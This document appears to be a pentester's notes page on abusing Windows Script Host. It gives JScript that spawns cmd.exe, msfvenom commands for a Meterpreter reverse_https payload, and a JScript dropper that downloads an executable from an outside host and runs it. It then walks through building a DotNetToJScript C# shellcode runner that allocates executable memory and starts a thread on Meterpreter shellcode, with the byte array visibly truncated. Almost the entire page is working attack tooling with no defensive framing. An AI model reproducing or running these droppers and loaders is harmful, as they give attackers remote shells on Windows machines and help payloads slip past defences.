# Windows Scripting Host

## Jscript launching cmd.exe through ActiveX

Save below file as .js and double click to execute

```javascript
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

## Jscript Meterpreter Dropper

Create a payload with meterpreter

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=443 -f exe -o msfstaged.exe
```
{% endcode %}

Create .js file to call the payload.&#x20;

```javascript
var url = "http://192.168.49.64/msfstaged.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("msfstaged.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("msfstaged.exe");
```

## DotNetToJscript

### Basic Workflow

1. Open DotNetToJscript from the SMB share in VisualStudio
2. Make modifications to ExampleAssembly\TestClass.cs then compile
3. Copy `DotNetToJscript.exe` & `NDesk.Options.dll` from `\\kali\DotNetToJScript-master\DotNetToJScript\bin\Release` folder to Windows host.&#x20;
4. Copy `ExampleAssembly.dll` from `\\kali\DotNetToJScript-master\ExampleAssembly\bin\Release` folder to Windows host.&#x20;
5. On Windows host run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`

### Jscript Shellcode Runner

Generate shellcode using msfvenom

{% code overflow="wrap" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.64 LPORT=443 -f csharp
```
{% endcode %}

Open `\\kali\JscriptRunner\DotNetToJScript.sln` in Visual Studio on the Windows development host, it should look like below. Replace the shellcode with the one just generated and then build the solution.&#x20;

```csharp
//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        byte[] buf = new byte[709] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
            0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,
            0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
            0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,
            0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5};

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

Copy `DotNetToJscript.exe` & `NDesk.Options.dll` from `\\kali\DotNetToJScript-master\JscriptRunner\bin\Release` folder to Windows host.

Copy `ExampleAssembly.dll` from `\\kali\JscriptRunner\ExampleAssembly\bin\x64\Release` folder to Windows host.&#x20;

Generate shellcode.js file on the Windows development host

```powershell
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o shellcode.js
```
